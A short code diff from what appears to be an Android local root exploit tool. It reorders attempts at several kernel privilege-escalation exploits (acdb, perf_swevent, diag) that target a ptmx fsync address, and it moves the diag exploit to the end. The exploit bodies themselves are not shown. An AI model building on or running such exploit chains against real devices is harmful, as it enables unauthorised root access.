@@ -74,11 +74,6 @@ run_exploit(void)
 
   ptmx_fsync_address = ptmx_fops_address + 0x38;
 
-  if (attempt_diag_exploit(ptmx_fsync_address)) {
-    return true;
-  }
-  printf("\n");
-
   printf("Attempt acdb exploit...\n");
   if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
     return true;
@@ -86,8 +81,13 @@ run_exploit(void)
   printf("\n");
 
   printf("Attempt perf_swevent exploit...\n");
-  return perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
-                                  run_obtain_root_privilege, NULL);
+  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
+                                  run_obtain_root_privilege, NULL)) {
+    return true;
+  }
+  printf("\n");
+
+  return attempt_diag_exploit(ptmx_fsync_address);
 }
 
 int
